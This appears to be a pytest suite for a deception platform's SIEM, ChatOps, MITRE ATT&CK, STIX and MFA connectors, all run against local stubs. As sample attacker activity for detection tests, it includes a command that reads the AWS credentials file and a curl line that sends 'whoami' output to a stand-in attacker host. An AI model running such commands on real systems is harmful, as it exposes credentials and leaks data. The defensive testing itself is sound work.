"""Tests for the SIEM/SOAR/MFA/ChatOps connector ecosystem.

Four layers:

  1. Format emitters — CEF/LEEF/Syslog/JSON shape invariants
  2. MITRE ATT&CK — enrichment + Sigma tag rendering + coverage shape
  3. SIEM transports — exercise the HTTP path against a local stub server
  4. ChatOps — Slack/Teams/PagerDuty payload shape against the spec
  5. STIX — bundle structure + IoC extraction

No live SIEM/Slack/Duo is needed — every test runs locally.
"""
import asyncio
import json
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from plenith.connectors import (
    chatops,
    formats,
    mfa_providers,
    mitre,
    siem,
    stix,
)


# ---------------------------------------------------------------------------
# Sample alert dict used across tests
# ---------------------------------------------------------------------------

@pytest.fixture
def alert():
    a = {
        "action":        "alert_credential_exfil",
        "severity":      "high",
        "rationale":     "Attacker read planted ~/.aws/credentials honeytoken.",
        "engagement_id": "7b6c-abc1",
        "source_ip":     "192.0.2.99",
        "claimed_user":  "jdoe",
        "hostname":      "bastion-prod",
        "triggered_by":  "cat ~/.aws/credentials",
        "ts_offset_s":   124.5,
    }
    mitre.enrich(a)
    return a


# ===========================================================================
# Formats
# ===========================================================================

class TestCEF:
    def test_header_and_extension(self, alert):
        line = formats.to_cef(alert)
        assert line.startswith("CEF:0|Plenith|DeceptionPlatform|1.0|")
        assert "MC-alert_credential_exfil" in line
        # Severity score 7 for "high"
        assert "|7|" in line
        # Extension fields present
        for needle in ("src=192.0.2.99", "suser=jdoe", "dhost=bastion-prod",
                       "cs1=7b6c-abc1"):
            assert needle in line

    def test_escapes_pipes_in_values(self):
        a = {"action": "x", "severity": "info",
             "rationale": "danger | pipe"}
        line = formats.to_cef(a)
        # Pipe inside the rationale extension value must be escaped
        assert "danger \\| pipe" in line

    def test_escapes_equals_in_values(self):
        a = {"action": "x", "severity": "info",
             "rationale": "key=value embedded"}
        line = formats.to_cef(a)
        assert "key\\=value" in line

    def test_mitre_technique_carried(self, alert):
        line = formats.to_cef(alert)
        # alert has been mitre.enriched; cs3 should carry T1552.001
        assert "cs3=T1552.001" in line
        assert "cs3Label=MitreTechnique" in line


class TestLEEF:
    def test_basic_shape(self, alert):
        line = formats.to_leef(alert)
        assert line.startswith("LEEF:2.0|Plenith|DeceptionPlatform|1.0|")
        # tab separator
        assert "\t" in line
        # severity numeric + label
        assert "sev=7" in line
        assert "severity=high" in line
        assert "src=192.0.2.99" in line


class TestSyslog5424:
    def test_pri_severity_mapping(self, alert):
        line = formats.to_syslog_5424(alert, body_format="plain")
        # high → local0.error → 16*8+3 = 131
        assert line.startswith("<131>")

    def test_carries_cef_body(self, alert):
        line = formats.to_syslog_5424(alert, body_format="cef")
        assert "CEF:0|" in line

    def test_iso_timestamp(self, alert):
        line = formats.to_syslog_5424(alert, body_format="plain")
        # Timestamp ends with Z (UTC)
        assert "T" in line and "Z " in line


class TestJSONEvent:
    def test_no_null_fields(self):
        a = {"action": "x", "severity": "info"}  # most fields absent
        env = formats.to_json_event(a)
        # event sub-dict should NOT contain None values
        for v in env["event"].values():
            assert v is not None

    def test_mitre_section_when_enriched(self, alert):
        env = formats.to_json_event(alert)
        assert env["event"]["mitre"]["technique"] == "T1552.001"


# ===========================================================================
# MITRE ATT&CK
# ===========================================================================

class TestMitre:
    def test_credential_exfil_maps_to_T1552(self):
        m = mitre.technique_for("alert_credential_exfil")
        assert m is not None
        assert m.technique == "T1552.001"
        assert m.tactic == "Credential Access"

    def test_lateral_decoy_maps_to_T1021(self):
        m = mitre.technique_for("alert_lateral_decoy")
        assert m.technique == "T1021.004"

    def test_reverse_shell_multiple_techniques(self):
        ms = mitre.all_techniques_for("alert_reverse_shell")
        assert len(ms) >= 2
        techs = {m.technique for m in ms}
        assert "T1059.004" in techs
        assert "T1095" in techs

    def test_unknown_action_returns_empty(self):
        assert mitre.technique_for("alert_nonexistent") is None
        assert mitre.all_techniques_for("alert_nonexistent") == []

    def test_enrich_in_place(self):
        a = {"action": "alert_credential_exfil"}
        mitre.enrich(a)
        assert a["mitre_technique"] == "T1552.001"
        assert a["mitre_tactic"] == "Credential Access"
        assert "mitre_techniques" in a   # >1 mapping

    def test_enrich_returns_same_dict(self):
        a = {"action": "alert_credential_exfil"}
        result = mitre.enrich(a)
        assert result is a

    def test_enrich_action_without_mapping(self):
        a = {"action": "alert_nonexistent"}
        mitre.enrich(a)
        # Should NOT add MITRE fields
        assert "mitre_technique" not in a

    def test_sigma_tags_format(self):
        tags = mitre.sigma_tags("alert_credential_search")
        assert "attack.t1552.001" in tags
        # Tactic also tagged
        assert any(t.startswith("attack.credential_access") for t in tags)

    def test_coverage_report(self):
        rep = mitre.coverage_report()
        assert "actions" in rep
        assert "tactics_covered" in rep
        assert "techniques_covered" in rep
        # Sanity: at least 5 techniques mapped across our action space
        assert len(rep["techniques_covered"]) >= 5

    def test_counter_ai_uses_vendor_extension(self):
        m = mitre.technique_for("alert_attacker_llm_detected")
        # Counter-AI doesn't have an official ATT&CK technique yet;
        # we use a vendor-prefixed ID.
        assert m is not None
        assert m.technique.startswith("MC-")


# ===========================================================================
# SIEM transports — exercise via a stub server
# ===========================================================================

class _StubHandler(BaseHTTPRequestHandler):
    requests: list = []

    def log_message(self, *a):
        pass

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length).decode("utf-8") if length else ""
        _StubHandler.requests.append({
            "path":    self.path,
            "headers": dict(self.headers),
            "body":    body,
        })
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()


@pytest.fixture
def stub_server():
    _StubHandler.requests = []
    server = ThreadingHTTPServer(("127.0.0.1", 0), _StubHandler)
    port = server.server_address[1]
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    yield f"http://127.0.0.1:{port}"
    server.shutdown()


class TestSplunkHEC:
    @pytest.mark.asyncio
    async def test_emit_buffers_and_flushes(self, alert, stub_server):
        client = siem.SplunkHEC(url=stub_server, token="t",
                                 batch_size=2, batch_window_seconds=0.1)
        await client.emit(alert)
        # Not yet flushed (batch_size = 2)
        assert _StubHandler.requests == []
        await client.emit(alert)
        # Now flushed
        assert len(_StubHandler.requests) == 1
        assert _StubHandler.requests[0]["path"].endswith("/services/collector/event")
        assert _StubHandler.requests[0]["headers"].get("Authorization") == "Splunk t"
        # Body is NDJSON of 2 events
        lines = _StubHandler.requests[0]["body"].strip().split("\n")
        assert len(lines) == 2
        for line in lines:
            d = json.loads(line)
            assert d["sourcetype"] == "plenith:alert"


class TestElasticBulk:
    @pytest.mark.asyncio
    async def test_emit_and_flush(self, alert, stub_server):
        client = siem.ElasticBulk(url=stub_server, batch_size=1)
        await client.emit(alert)
        # batch_size=1 → flushes immediately
        assert len(_StubHandler.requests) == 1
        assert _StubHandler.requests[0]["path"].endswith("/_bulk")
        body = _StubHandler.requests[0]["body"]
        # NDJSON: index-action line + source line
        lines = body.strip().split("\n")
        assert len(lines) == 2
        action_line = json.loads(lines[0])
        source_line = json.loads(lines[1])
        assert "index" in action_line
        assert source_line["action"] == "alert_credential_exfil"


class TestGenericWebhook:
    @pytest.mark.asyncio
    async def test_post_emits_alert(self, alert, stub_server):
        client = siem.GenericWebhook(url=stub_server + "/incoming")
        await client.emit(alert)
        assert len(_StubHandler.requests) == 1
        body = json.loads(_StubHandler.requests[0]["body"])
        assert body["event"]["action"] == "alert_credential_exfil"


class TestFanOut:
    @pytest.mark.asyncio
    async def test_failures_are_isolated(self, alert, stub_server):
        # One working, one pointing at nothing
        ok = siem.GenericWebhook(url=stub_server + "/ok")
        bad = siem.GenericWebhook(url="http://127.0.0.1:1/never-listening",
                                   timeout_seconds=0.3)
        fan = siem.FanOut(emitters=[ok, bad])
        # Must NOT raise even though `bad` will fail
        await fan.emit(alert)
        # The good one received
        assert any("/ok" in r["path"] for r in _StubHandler.requests)


class TestBuildFromConfig:
    def test_empty_config_returns_none(self):
        assert siem.build_from_config(None) is None
        assert siem.build_from_config({}) is None
        assert siem.build_from_config({"connectors": {}}) is None

    def test_splunk_only(self):
        fan = siem.build_from_config({
            "connectors": {"splunk_hec": {"url": "https://x", "token": "t"}},
        })
        assert fan is not None
        assert len(fan.emitters) == 1
        assert isinstance(fan.emitters[0], siem.SplunkHEC)


# ===========================================================================
# ChatOps payload shape
# ===========================================================================

class TestSlackPayload:
    def test_attachment_color_matches_severity(self, alert):
        p = chatops.SlackWebhook(url="http://x")._payload(alert)
        # high → orange
        assert p["attachments"][0]["color"] == "#e8851e"

    def test_fields_present(self, alert):
        p = chatops.SlackWebhook(url="http://x")._payload(alert)
        fields = p["attachments"][0]["fields"]
        labels = {f["title"] for f in fields}
        # Source / User / Host / ATT&CK / Engagement are all set on our test alert
        assert "Source" in labels
        assert "User" in labels
        assert "ATT&CK" in labels


class TestTeamsPayload:
    def test_messagecard_schema(self, alert):
        p = chatops.TeamsWebhook(url="http://x")._payload(alert)
        assert p["@type"] == "MessageCard"
        assert p["@context"] == "https://schema.org/extensions"
        # Color is hex-without-hash
        assert p["themeColor"] == "e8851e"


class TestPagerDutyPayload:
    def test_severity_mapping(self, alert):
        p = chatops.PagerDutyEventsV2(routing_key="k")._payload(alert)
        assert p["payload"]["severity"] == "error"   # high → error

    def test_below_threshold_skipped(self):
        a = {"action": "alert_info_only", "severity": "info"}
        pd = chatops.PagerDutyEventsV2(routing_key="k", minimum_severity="high")
        assert not pd._should_page(a)

    def test_critical_pages_always(self):
        a = {"action": "alert_revshell", "severity": "critical"}
        pd = chatops.PagerDutyEventsV2(routing_key="k", minimum_severity="high")
        assert pd._should_page(a)

    def test_dedup_key_includes_engagement(self, alert):
        p = chatops.PagerDutyEventsV2(routing_key="k")._payload(alert)
        assert "7b6c-abc1" in p["dedup_key"]


# ===========================================================================
# STIX
# ===========================================================================

class TestSTIX:
    def test_empty_bundle_has_identity(self):
        bundle = stix.bundle_from_engagements([])
        assert bundle["type"] == "bundle"
        # Always has the producer identity
        assert any(o["type"] == "identity" for o in bundle["objects"])

    def test_engagement_produces_ipv4_indicator(self):
        eng = {
            "engagement_id": "abc",
            "source_ip":     "203.0.113.5",
            "observed":      {},
            "actions_taken": [],
        }
        bundle = stix.bundle_from_engagements([eng])
        types = {o["type"] for o in bundle["objects"]}
        assert "indicator" in types
        # Find the IPv4 indicator
        indicators = [o for o in bundle["objects"] if o["type"] == "indicator"]
        assert any("203.0.113.5" in o["pattern"] for o in indicators)

    def test_dns_exfil_yields_domain_indicator(self):
        eng = {
            "engagement_id": "abc",
            "source_ip":     "203.0.113.5",
            "observed":      {
                "dns_exfil_commands": [
                    "curl https://attacker.x.oast.live/$(whoami)",
                ],
            },
            "actions_taken": [],
        }
        bundle = stix.bundle_from_engagements([eng])
        indicators = [o for o in bundle["objects"] if o["type"] == "indicator"]
        assert any("oast.live" in o.get("pattern", "") for o in indicators)

    def test_actions_produce_attack_patterns(self):
        eng = {
            "engagement_id": "abc",
            "source_ip":     "203.0.113.5",
            "observed":      {},
            "actions_taken": [
                {"action": "alert_credential_exfil"},
                {"action": "alert_reverse_shell"},
            ],
        }
        bundle = stix.bundle_from_engagements([eng])
        attack_patterns = [o for o in bundle["objects"] if o["type"] == "attack-pattern"]
        # alert_credential_exfil maps to T1552.001 + T1005;
        # alert_reverse_shell maps to T1059.004 + T1095. Total = 4.
        assert len(attack_patterns) >= 3
        techniques = {
            ref["external_id"]
            for ap in attack_patterns
            for ref in ap.get("external_references", [])
            if ref.get("source_name") == "mitre-attack"
        }
        assert "T1552.001" in techniques
        assert "T1059.004" in techniques

    def test_stable_ids_dedupe(self):
        """Re-running on the same engagement produces identical IDs."""
        eng = {
            "engagement_id": "abc",
            "source_ip":     "203.0.113.5",
            "observed":      {},
            "actions_taken": [],
        }
        b1 = stix.bundle_from_engagements([eng])
        b2 = stix.bundle_from_engagements([eng])
        ids_1 = sorted(o["id"] for o in b1["objects"])
        ids_2 = sorted(o["id"] for o in b2["objects"])
        assert ids_1 == ids_2


# ===========================================================================
# MFA providers — factory only (real provider calls require credentials)
# ===========================================================================

class TestMFAProviderFactory:
    def test_no_config_returns_none(self):
        assert mfa_providers.build_from_config(None) is None
        assert mfa_providers.build_from_config({}) is None

    def test_push_sim_provider(self):
        p = mfa_providers.build_from_config({
            "mfa": {"provider": "push-sim",
                     "push_sim": {"base_url": "http://x:8080"}},
        })
        assert isinstance(p, mfa_providers.PushSimClient)
        assert p.base_url == "http://x:8080"

    def test_duo_provider(self):
        p = mfa_providers.build_from_config({
            "mfa": {"provider": "duo",
                     "duo": {"host": "api-x.duosecurity.com",
                             "integration_key": "DI...",
                             "secret_key": "SK..."}},
        })
        assert isinstance(p, mfa_providers.DuoAuthClient)
        assert p.host == "api-x.duosecurity.com"

    def test_okta_provider(self):
        p = mfa_providers.build_from_config({
            "mfa": {"provider": "okta",
                     "okta": {"org_url": "https://x.okta.com",
                              "api_token": "T"}},
        })
        assert isinstance(p, mfa_providers.OktaVerifyClient)

    def test_twilio_provider(self):
        p = mfa_providers.build_from_config({
            "mfa": {"provider": "twilio",
                     "twilio": {"service_sid": "VA...",
                                "account_sid": "AC...",
                                "auth_token": "T"}},
        })
        assert isinstance(p, mfa_providers.TwilioVerifyClient)

    def test_unknown_provider_returns_none(self):
        assert mfa_providers.build_from_config({
            "mfa": {"provider": "nonexistent"},
        }) is None
